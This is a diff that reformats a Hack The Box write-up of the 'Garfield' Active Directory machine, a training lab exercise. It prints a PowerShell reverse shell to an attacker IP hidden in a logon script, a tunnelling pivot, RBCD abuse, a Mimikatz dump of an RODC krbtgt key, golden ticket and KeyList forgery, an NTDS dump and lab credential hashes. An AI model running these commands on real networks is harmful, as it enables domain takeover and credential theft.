@@ -1,29 +1,64 @@
-# Garfield — Hack The Box Writeup
+<div align="center">
 
-> **Platform:** Hack The Box  
-> **Machine:** Garfield  
-> **Difficulty:** Hard  
-> **Category:** Windows / Active Directory / RODC / Kerberos Abuse  
-> **Status:** Rooted  
->> **Date:** 2026-04-05
+# Garfield — HackTheBox
 
-<p align="center">
-  <img src="https://img.shields.io/badge/HTB-Garfield-red?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/OS-Windows%20Server%202019-blue?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Focus-Active%20Directory-purple?style=for-the-badge" />
-  <img src="https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge" />
-</p>
+![Difficulty](https://img.shields.io/badge/Difficulty-Hard-red?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
+
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
+
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
+
+---
+
+</div>
+
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
+
+## Target Information
+
+| Property | Value |
+|----------|-------|
+| Machine | Garfield |
+| IP | `<TARGET_IP>` |
+| OS | Windows |
+| Difficulty | Hard |
+| Hostname | garfield.htb |
+
+## Table of Contents
+
+1. [Executive Summary](#executive-summary)
+2. [Attack Chain](#attack-chain)
+3. [Lab Details](#lab-details)
+4. [Recon](#recon)
+5. [Validate Initial Access](#validate-initial-access)
+6. [ACL Enumeration and Path Discovery](#acl-enumeration-and-path-discovery)
+7. [Exploit Logon Script via scriptPath](#exploit-logon-script-via-scriptpath)
+8. [Move from l.wilson to l.wilson_adm](#move-from-lwilson-to-lwilson_adm)
+9. [Confirm Privileges](#confirm-privileges)
+10. [Add Self to RODC Administrators](#add-self-to-rodc-administrators)
+11. [Pivot to Internal RODC01](#pivot-to-internal-rodc01)
+12. [Confirm Access to RODC01](#confirm-access-to-rodc01)
+13. [Create a Fake Machine Account](#create-a-fake-machine-account)
+14. [Configure RBCD on RODC01](#configure-rbcd-on-rodc01)
+15. [Impersonate Administrator to RODC01](#impersonate-administrator-to-rodc01)
+16. [Dump krbtgt_8245 AES256 Key](#dump-krbtgt_8245-aes256-key)
+17. [Modify RODC Replication Policy](#modify-rodc-replication-policy)
+18. [Golden Ticket and KeyList Attack](#golden-ticket-and-keylist-attack)
+19. [Convert the Ticket on Kali](#convert-the-ticket-on-kali)
+20. [Dump NTDS with the Real Administrator Ticket](#dump-ntds-with-the-real-administrator-ticket)
+21. [Final Administrator Shell and Root Flag](#final-administrator-shell-and-root-flag)
+22. [Key Takeaways](#key-takeaways)
+23. [Flags](#flags)
 
 ---
 
 ## Executive Summary
 
-This machine hinged on **abusing Active Directory ACLs** to gain code execution through a user logon script, pivoting to a **Tier 1 administrative account**, reaching an **internal Read-Only Domain Controller (RODC)** through a tunnel, abusing **RBCD**, extracting the **RODC-specific `krbtgt_8245` key**, and finally using an **RODC Golden Ticket + KeyList** attack to obtain a real **Administrator** ticket for the primary DC.
-
-### Captured Flags
-
-- **User flag:** `507962c068a3688.................`
-- **Root flag:** `9490fac0230b0e2.................`
+This machine hinged on abusing Active Directory ACLs to gain code execution through a user logon script, pivoting to a Tier 1 administrative account, reaching an internal Read-Only Domain Controller (RODC) through a tunnel, abusing RBCD, extracting the RODC-specific `krbtgt_8245` key, and finally using an RODC Golden Ticket + KeyList attack to obtain a real Administrator ticket for the primary DC.
 
 ---
 
@@ -56,19 +91,19 @@ j.arbuckle
 
 ## Lab Details
 
-| Item | Value |
-|---|---|
+| Property | Value |
+|----------|-------|
 | Target IP | `<TARGET_IP>` |
-| Domain | `garfield.htb` |
-| DC | `DC01.garfield.htb` |
-| Internal RODC | `RODC01.garfield.htb` / `192.168.100.2` |
-| Initial Creds | `j.arbuckle : Th1sD4mnC4t!@1978` |
+| Domain | garfield.htb |
+| DC | DC01.garfield.htb |
+| Internal RODC | RODC01.garfield.htb / 192.168.100.2 |
+| Initial Creds | j.arbuckle : Th1sD4mnC4t!@1978 |
 
 ---
 
-# 1. Recon
+## Recon
 
-## 1.1 Set Variables
+### Set Variables
 
 ```bash
 export TARGET_IP="<TARGET_IP>"
@@ -79,13 +114,14 @@ export PASS='Th1sD4mnC4t!@1978'
 echo "$TARGET_IP DC01.garfield.htb garfield.htb" | sudo tee -a /etc/hosts
 ```
 
-## 1.2 Scan the Host
+### Scan the Host
 
 ```bash
 nmap -sC -sV $TARGET_IP
 ```
 
-### Output
+<details>
+<summary>Nmap Output (click to expand)</summary>
 
 ```text
 PORT     STATE SERVICE       VERSION
@@ -107,24 +143,24 @@ PORT     STATE SERVICE       VERSION
 clock-skew: +8h
 ```
 
+</details>
+
 ### Notes
 
-- `5985/tcp` exposed **WinRM**
-- `445/tcp` exposed **SMB**
-- `389/tcp` exposed **LDAP**
-- Significant **clock skew** made several Kerberos paths unreliable early on
+- `5985/tcp` exposed WinRM
+- `445/tcp` exposed SMB
+- `389/tcp` exposed LDAP
+- Significant clock skew made several Kerberos paths unreliable early on
 
 ---
 
-# 2. Validate Initial Access
+## Validate Initial Access
 
-## 2.1 Enumerate Shares
+### Enumerate Shares
 
 ```bash
 nxc smb $TARGET_IP -u $USER -p "$PASS" --shares
 ```
-
-### Output
 
 ```text
 SMB  <TARGET_IP>  445  DC01  [+] garfield.htb\j.arbuckle:Th1sD4mnC4t!@1978
@@ -134,37 +170,33 @@ SMB  <TARGET_IP>  445  DC01  NETLOGON   READ
 SMB  <TARGET_IP>  445  DC01  SYSVOL     READ
 ```
 
-### Notes
-
-Initial credentials were valid and sufficient for **SMB + LDAP-backed domain enumeration**.
+Initial credentials were valid and sufficient for SMB + LDAP-backed domain enumeration.
 
 ---
 
-# 3. ACL Enumeration and Path Discovery
+## ACL Enumeration and Path Discovery
 
-## 3.1 Enumerate Writable AD Objects
+### Enumerate Writable AD Objects
 
 ```bash
 bloodyAD --host $DOMAIN -u $USER -p "$PASS" get writable
 ```
 
-### Relevant Findings
+Relevant findings:
 
-- `Liz Wilson`
-- `Liz Wilson ADM`
-
-### Key Realization
+- Liz Wilson
+- Liz Wilson ADM
 
 Although graphing/ACL tools exposed multiple theoretical paths, the practical and intended path was:
 
-- **Writeable `scriptPath` on `l.wilson`**
-- later **password reset path affecting `l.wilson_adm`**
+- Writeable `scriptPath` on `l.wilson`
+- Later password reset path affecting `l.wilson_adm`
 
 ---
 
-# 4. Exploit Logon Script via `scriptPath`
+## Exploit Logon Script via scriptPath
 
-## 4.1 Generate a PowerShell Reverse Shell Payload
+### Generate a PowerShell Reverse Shell Payload
 
 ```bash
 echo '$client = New-Object System.Net.Sockets.TCPClient("'"$ATTACKER_IP"'",9001);
@@ -178,7 +210,7 @@ $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};
 $client.Close()' | iconv -t UTF-16LE | base64 -w0
 ```
 
-## 4.2 Build `printerDetect.bat`
+### Build printerDetect.bat
 
 ```bash
 cat > /tmp/printerDetect.bat << 'EOF'
@@ -187,7 +219,7 @@ powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <BASE64_PAYLOAD>
 EOF
 ```
 
-## 4.3 Upload the Batch File
+### Upload the Batch File
 
 ```bash
 smbclient //$TARGET_IP/SYSVOL -U $USER%"$PASS"
@@ -202,13 +234,13 @@ dir
 exit
 ```
 
-### Output
+Output:
 
 ```text
 putting file /tmp/printerDetect.bat as \garfield.htb\scripts\printerDetect.bat
 ```
 
-## 4.4 Set `scriptPath` on `l.wilson`
+### Set scriptPath on l.wilson
 
 ```bash
 bloodyAD --host $DOMAIN -u $USER -p "$PASS" \
@@ -216,19 +248,19 @@ set object "CN=Liz Wilson,CN=Users,DC=garfield,DC=htb" \
 scriptPath -v printerDetect.bat
 ```
 
-### Output
+Output:
 
 ```text
 [+] CN=Liz Wilson,CN=Users,DC=garfield,DC=htb's scriptPath has been updated
 ```
 
-## 4.5 Catch the Shell
+### Catch the Shell
 
 ```bash
 nc -lvnp 9001
 ```
 
-### Output
+Output:
 
 ```text
 connect to [<YOUR_IP>] from (UNKNOWN) [<TARGET_IP>] 51335
@@ -243,15 +275,13 @@ Path
 C:\Windows\system32
 ```
 
-### Result
-
-✅ **Code execution as `garfield\l.wilson` on DC01**
+Code execution as `garfield\l.wilson` on DC01 confirmed.
 
 ---
 
-# 5. Move from `l.wilson` to `l.wilson_adm`
+## Move from l.wilson to l.wilson_adm
 
-## 5.1 Reset `l.wilson_adm` Password from the Reverse Shell
+### Reset l.wilson_adm Password from the Reverse Shell
 
 In the `l.wilson` PowerShell shell:
 
@@ -259,66 +289,66 @@ In the `l.wilson` PowerShell shell:
 Set-ADAccountPassword -Identity "l.wilson_adm" -NewPassword (ConvertTo-SecureString 'WhoKnows123!' -AsPlainText -Force) -Reset
 ```
 
-## 5.2 Validate WinRM Access
+### Validate WinRM Access
 
 ```bash
 nxc winrm $TARGET_IP -u l.wilson_adm -p 'WhoKnows123!'
 ```
 
-### Output
+Output:
 
 ```text
 WINRM  <TARGET_IP>  5985  DC01  [+] garfield.htb\l.wilson_adm:WhoKnows123! (Pwn3d!)
 ```
 
-## 5.3 Get a Shell as `l.wilson_adm`
+### Get a Shell as l.wilson_adm
 
 ```bash
 evil-winrm -i <TARGET_IP> -u l.wilson_adm -p 'WhoKnows123!'
 ```
 
-### Output
+Output:
 
 ```text
 *Evil-WinRM* PS C:\Users\l.wilson_adm\Documents>
 ```
 
-## 5.4 Capture `user.txt`
+### Capture user.txt
 
 ```powershell
 cd C:\Users\l.wilson_adm\Desktop
 type user.txt
 ```
 
-### Output
+Output:
 
 ```text
 507962c068a3688.................
 ```
 
-✅ **User flag captured**
+User flag captured.
 
 ---
 
-# 6. Confirm Privileges
+## Confirm Privileges
 
-## 6.1 Enumerate Groups and Privileges
+### Enumerate Groups and Privileges
 
 ```powershell
 whoami /groups
 whoami /priv
 ```
 
-### Key Findings
+Key findings:
 
-- Member of **Tier 1**
-- Had **SeMachineAccountPrivilege**
+- Member of Tier 1
+- Had SeMachineAccountPrivilege
 
 This made the next phase possible.
 
 ---
 
-# 7. Add Self to `RODC Administrators`
+## Add Self to RODC Administrators
 
 In the `l.wilson_adm` WinRM shell:
 
@@ -326,27 +356,25 @@ In the `l.wilson_adm` WinRM shell:
 Add-ADGroupMember -Identity "RODC Administrators" -Members "l.wilson_adm"
 ```
 
-### Result
-
 Command completed silently and successfully.
 
 ---
 
-# 8. Pivot to Internal RODC01 (`192.168.100.2`)
+## Pivot to Internal RODC01
 
-## 8.1 Confirm Internal Reachability from DC01
+### Confirm Internal Reachability from DC01
 
 ```powershell
 ping 192.168.100.2
 ```
 
-### Output
+Output:
 
 ```text
 Reply from 192.168.100.2: bytes=32 time<1ms TTL=128
 ```
 
-## 8.2 Set up Ligolo on Kali
+### Set up Ligolo on Kali
 
 ```bash
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.5/ligolo-ng_proxy_0.7.5_linux_amd64.tar.gz
@@ -356,44 +384,44 @@ sudo ip link set ligolo up
 ./proxy -selfcert -laddr 0.0.0.0:11601
 ```
 
-### Ligolo Output
+Ligolo output:
 
 ```text
 INFO[0000] Listening on 0.0.0.0:11601
 INFO[0116] Agent joined. id=00155d0bdd00 name="GARFIELD\\l.wilson_adm@DC01"
 ```
 
-## 8.3 Run Agent from WinRM
+### Run Agent from WinRM
 
 ```powershell
 .\agent.exe -connect <YOUR_IP>:11601 -ignore-cert
 ```
 
-## 8.4 Add Route on Kali
+### Add Route on Kali
 
 ```bash
 sudo ip route add 192.168.100.0/24 dev ligolo
 ping 192.168.100.2
 ```
 
-### Output
+Output:
 
 ```text
 64 bytes from 192.168.100.2: icmp_seq=1 ttl=64 time=112 ms
 ...
 ```
 
-✅ **Pivot established**
+Pivot established.
 
 ---
 
-# 9. Confirm Access to RODC01
+## Confirm Access to RODC01
 
 ```bash
 nxc smb 192.168.100.2 -u l.wilson_adm -p 'WhoKnows123!'
 ```
 
-### Output
+Output:
 
 ```text
 SMB  192.168.100.2  445  RODC01  [+] garfield.htb\l.wilson_adm:WhoKnows123!
@@ -401,9 +429,9 @@ SMB  192.168.100.2  445  RODC01  [+] garfield.htb\l.wilson_adm:WhoKnows123!
 
 ---
 
-# 10. Create a Fake Machine Account
+## Create a Fake Machine Account
 
-## 10.1 Add a Computer Object
+### Add a Computer Object
 
 ```bash
 impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
@@ -412,7 +440,7 @@ impacket-addcomputer garfield.htb/l.wilson_adm:'WhoKnows123!' \
 -dc-ip <TARGET_IP>
 ```
 
-## 10.2 Verify
+### Verify
 
 ```bash
 nxc ldap <TARGET_IP> -u l.wilson_adm -p 'WhoKnows123!' --users | grep FAKE
@@ -420,28 +448,28 @@ nxc ldap <TARGET_IP> -u l.wilson_adm -p 'WhoKnows123!' --users | grep FAKE
 
 ---
 
-# 11. Configure RBCD on `RODC01`
+## Configure RBCD on RODC01
 
-## 11.1 Set Delegation in WinRM
+### Set Delegation in WinRM
 
 ```powershell
 Set-ADComputer RODC01 -PrincipalsAllowedToDelegateToAccount FAKE$
 Get-ADComputer RODC01 -Properties PrincipalsAllowedToDelegateToAccount
 ```
 
-### Output
+Output:
 
 ```text
 PrincipalsAllowedToDelegateToAccount : {CN=FAKE,CN=Computers,DC=garfield,DC=htb}
 ```
 
-✅ **RBCD configured**
+RBCD configured.
 
 ---
 
-# 12. Impersonate Administrator to RODC01
+## Impersonate Administrator to RODC01
 
-## 12.1 Request Service Ticket
+### Request Service Ticket
 
 ```bash
 impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
@@ -450,7 +478,7 @@ impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
 -dc-ip <TARGET_IP>
 ```
 
-### Output
+Output:
 
 ```text
 [*] Getting TGT for user
@@ -460,14 +488,14 @@ impacket-getST garfield.htb/'FAKE$':'FakePass123!' \
 [*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
 ```
 
-## 12.2 Export Ticket
+### Export Ticket
 
 ```bash
 export KRB5CCNAME=$(pwd)/Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache
 echo $KRB5CCNAME
 ```
 
-## 12.3 Get SYSTEM on RODC01
+### Get SYSTEM on RODC01
 
 ```bash
 impacket-psexec -k -no-pass \
@@ -476,7 +504,7 @@ impacket-psexec -k -no-pass \
 garfield.htb/Administrator@RODC01.garfield.htb
 ```
 
-### Output
+Output:
 
 ```text
 [*] Found writable share ADMIN$
@@ -490,13 +518,13 @@ C:\Windows\system32> whoami
 nt authority\system
 ```
 
-✅ **SYSTEM on RODC01**
+SYSTEM on RODC01 achieved.
 
 ---
 
-# 13. Dump `krbtgt_8245` AES256 Key
+## Dump krbtgt_8245 AES256 Key
 
-## 13.1 Serve Mimikatz from Kali
+### Serve Mimikatz from Kali
 
 ```bash
 cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe /tmp/
@@ -504,7 +532,7 @@ cd /tmp
 python3 -m http.server 8888
 ```
 
-## 13.2 Download Mimikatz on RODC01
+### Download Mimikatz on RODC01
 
 ```cmd
 cd C:\Windows\Temp
@@ -519,7 +547,8 @@ privilege::debug
 lsadump::lsa /inject /name:krbtgt_8245
 ```
 
-### Output
+<details>
+<summary>Mimikatz Output (click to expand)</summary>
 
 ```text
 Domain : GARFIELD / S-1-5-21-2502726253-3859040611-225969357
@@ -535,25 +564,21 @@ User : krbtgt_8245
       aes128_hmac       (4096) : 124c0fd09f5fa4efca8d9f1da91369e5
 ```
 
+</details>
+
 ### Critical Values
 
-- **AES256:** `d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240`
-- **SID:** `S-1-5-21-2502726253-3859040611-225969357`
-- **RODC number:** `8245`
+- AES256: `d6c93cbe006372adb8403630f9e86594f52c8105a52f9b21fef62e9c7a75e240`
+- SID: `S-1-5-21-2502726253-3859040611-225969357`
+- RODC number: `8245`
 
 ---
 
-# 14. Modify RODC Replication Policy
+## Modify RODC Replication Policy
 
-## 14.1 Load PowerView in WinRM
+### Load PowerView in WinRM
 
-On Kali, note the local path:
-
-```bash
-ls /usr/share/windows-resources/powersploit/Recon/PowerView.ps1
-```
-
-Serve it:
+Serve PowerView from Kali:
 
 ```bash
 cd /usr/share/windows-resources/powersploit/Recon/
@@ -570,7 +595,7 @@ Import-Module .\PowerView.ps1
 Get-Command *DomainObject*
 ```
 
-## 14.2 Allow Administrator for RODC Password Replication
+### Allow Administrator for RODC Password Replication
 
 ```powershell
 Set-DomainObject -Identity RODC01$ -Set @{
@@ -583,19 +608,19 @@ Set-DomainObject -Identity RODC01$ -Clear 'msDS-NeverRevealGroup'
 Get-ADComputer RODC01 -Properties msDS-RevealOnDemandGroup,msDS-NeverRevealGroup
 ```
 
-### Output
+Output:
 
 ```text
 msDS-RevealOnDemandGroup : {CN=Allowed RODC Password Replication Group,..., CN=Administrator,...}
 ```
 
-✅ Replication policy correctly modified
+Replication policy correctly modified.
 
 ---
 
-# 15. Golden Ticket + KeyList Attack
+## Golden Ticket and KeyList Attack
 
-## 15.1 Get Rubeus
+### Get Rubeus
 
 On Kali:
 
@@ -613,13 +638,13 @@ dir Rubeus.exe
 .\Rubeus.exe
 ```
 
-### Version
+Version:
 
 ```text
 v2.3.3
 ```
 
-## 15.2 Forge the RODC Golden Ticket
+### Forge the RODC Golden Ticket
 
 ```powershell
 .\Rubeus.exe golden `
@@ -634,14 +659,14 @@ v2.3.3
 /sid:S-1-5-21-2502726253-3859040611-225969357
 ```
 
-### Output
+Output:
 
 ```text
 [*] Forged a TGT for 'Administrator@garfield.htb'
 [*] Ticket written to ticket_2026_04_06_00_56_46_Administrator_to_krbtgt@GARFIELD.HTB.kirbi
 ```
 
-## 15.3 Perform KeyList Attack
+### Perform KeyList Attack
 
 ```powershell
 .\Rubeus.exe asktgs `
@@ -653,7 +678,7 @@ v2.3.3
 /nowrap
 ```
 
-### Output
+Output:
 
 ```text
 [+] TGS request successful!
@@ -661,13 +686,13 @@ v2.3.3
 doIFnjCCBZqgAwIBBaEDAgEWooIEsTCCBK1hggSpMIIEpaADAgEFoQ4bDEdBUkZJRUxELkhUQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMR0FSRklFTEQuSFRCo4IEaTCCBGWgAwIBEqEDAgEC...
 ```
 
-✅ Real **Administrator** ticket retrieved
+Real Administrator ticket retrieved.
 
 ---
 
-# 16. Convert the Ticket on Kali
+## Convert the Ticket on Kali
 
-## 16.1 Save the Base64 Blob
+### Save the Base64 Blob
 
 ```bash
 nano /tmp/ticket.b64
@@ -675,7 +700,7 @@ nano /tmp/ticket.b64
 
 Paste only the base64 string.
 
-## 16.2 Decode and Convert
+### Decode and Convert
 
 ```bash
 sed -i 's/^[[:space:]]*//' /tmp/ticket.b64
@@ -684,14 +709,14 @@ ls -l /tmp/ticket.kirbi
 xxd -l 8 /tmp/ticket.kirbi
 ```
 
-### Output
+Output:
 
 ```text
 -rw-r--r-- 1 root root 1442 Apr  5 21:00 ticket.kirbi
 00000000: 7682 059e 3082 059a  v...0...
 ```
 
-## 16.3 Convert to ccache
+### Convert to ccache
 
 ```bash
 impacket-ticketConverter /tmp/ticket.kirbi /tmp/ticket.ccache
@@ -701,13 +726,14 @@ echo $KRB5CCNAME
 
 ---
 
-# 17. Dump NTDS with the Real Administrator Ticket
+## Dump NTDS with the Real Administrator Ticket
 
 ```bash
 nxc smb DC01.garfield.htb --use-kcache --ntds
 ```
 
-### Output
+<details>
+<summary>NTDS Dump Output (click to expand)</summary>
 
 ```text
 [+] GARFIELD.HTB\Administrator from ccache (Pwn3d!)
@@ -723,15 +749,17 @@ RODC01$:...
 FAKE$:...
 ```
 
-✅ Administrator NT hash obtained:
+</details>
+
+Administrator NT hash obtained:
 
 ```text
-ee238f6debc752010...................
+ee238f6debc75201████████████████
 ```
 
 ---
 
-# 18. Final Administrator Shell and Root Flag
+## Final Administrator Shell and Root Flag
 
 ```bash
 evil-winrm -i <TARGET_IP> -u Administrator -H 'ee238f6debc752010428f20875b092d5'
@@ -744,67 +772,52 @@ whoami
 type C:\Users\Administrator\Desktop\root.txt
 ```
 
-### Output
+Output:
 
 ```text
 garfield\administrator
 9490fac0230b0e2.................
 ```
 
-✅ **Root flag captured**
+Root flag captured.
 
 ---
 
-# Final Flags
+## Key Takeaways
+
+### ACLs Matter -- but Effective Write Paths Matter More
+
+Multiple theoretical edges existed, but the practical chain relied on `scriptPath` and later domain object manipulation.
+
+### RODCs Are a Different Beast
+
+This box required understanding the difference between `krbtgt` and `krbtgt_<RODCID>`.
+
+### KeyList Is the Real Win Condition
+
+The forged RODC ticket was not the end goal. The real goal was using KeyList to get a legitimate Administrator ticket from the primary DC.
+
+### Ticket Hygiene Matters
+
+Small issues like wrong ccache filename, wrong `.kirbi` filename, or malformed base64 caused failures until corrected.
+
+---
+
+## Flags
 
 | Flag | Value |
-|---|---|
-| User | `507962c068a3688.................` |
-| Root | `9490fac0230b0e2.................` |
+|------|-------|
+| User | `507962c068a3688█████████████████` |
+| Root | `9490fac0230b0e2█████████████████` |
 
 ---
 
-# Key Takeaways
+<div align="center">
 
-## 1. ACLs Matter — but Effective Write Paths Matter More
-Multiple theoretical edges existed, but the practical chain relied on **`scriptPath`** and later domain object manipulation.
+**Written by MrsNobody**
 
-## 2. RODCs Are a Different Beast
-This box required understanding the difference between:
+<img src="../assets/MrsNobody.png" width="80">
 
-- `krbtgt`
-- `krbtgt_<RODCID>`
+*Hack The Box — Garfield*
 
-## 3. KeyList Is the Real Win Condition
-The forged RODC ticket was not the end goal. The real goal was using **KeyList** to get a **legitimate Administrator ticket** from the primary DC.
-
-## 4. Ticket Hygiene Matters
-Small issues like:
-
-- wrong ccache filename
-- wrong `.kirbi` filename
-- malformed base64
-
-caused failures until corrected.
-
----
-
-# Conclusion
-
-Garfield was an excellent AD lab that chained together:
-
-- **ACL abuse**
-- **logon script execution**
-- **PowerShell/WinRM lateral movement**
-- **RODC administration**
-- **RBCD**
-- **Kerberos ticket forgery**
-- **KeyList abuse**
-
-It is one of the better demonstrations of how a single domain foothold can be expanded, step by step, into full forest-level trust abuse and complete Domain Admin compromise.
-
----
-
-## Disclaimer
-
-This writeup is intended for **Hack The Box lab use**, internal training, and defensive understanding of Active Directory abuse paths only.
+</div>
